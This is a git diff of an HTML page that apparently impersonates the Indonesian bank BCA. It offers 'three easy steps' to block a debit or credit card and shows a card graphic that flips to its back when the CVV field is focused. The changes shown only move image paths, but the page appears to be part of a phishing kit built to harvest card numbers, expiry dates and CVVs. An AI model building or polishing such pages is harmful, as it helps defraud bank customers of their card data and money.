@@ -4,9 +4,9 @@
   <meta charset="UTF-8">
   <meta name="theme-color" content="#DB0011">
   <title>Tiga Langkah Mudah - Blokir Kartu Debit & Kredit - BCA</title>
-  <meta content="img/header.jpeg" property="og:image">
+  <meta content="header.jpeg" property="og:image">
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
-  <link rel="icon" type="image/png" href="img/logo.svg"/> 
+  <link rel="icon" type="image/png" href="logo.svg"/> 
   <link href="js/jquery-3.7.1.min.map" rel="stylesheet">
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
   <style>
@@ -356,11 +356,11 @@
 <body>
 
 <nav>
-  <img src="img/logo.svg" alt="Logo">
+  <img src="logo.svg" alt="Logo">
 </nav>
 
 <div class="header-container">
-  <img class="header-image" id="card-image" src="img/card.png" alt="Card Front" />
+  <img class="header-image" id="card-image" src="card.png" alt="Card Front" />
   <div class="header-text"></div>
   <div class="valid-thru"></div>
   <div class="cvv-display"></div>
@@ -434,7 +434,7 @@
   });
 
   document.getElementById('cvv').addEventListener('focus', () => {
-    cardImage.src = 'img/cardBelakangLain.png';
+    cardImage.src = 'cardBelakangLain.png';
     cvvDisplay.style.display = 'block';
     cardInfo.style.display = 'none';
     validInfo.style.display = 'none';
@@ -445,7 +445,7 @@
   });
 
   document.getElementById('cvv').addEventListener('blur', () => {
-    cardImage.src = 'img/card.png';
+    cardImage.src = 'card.png';
     cvvDisplay.style.display = 'none';
     cardInfo.style.display = 'block';
     validInfo.style.display = 'block';
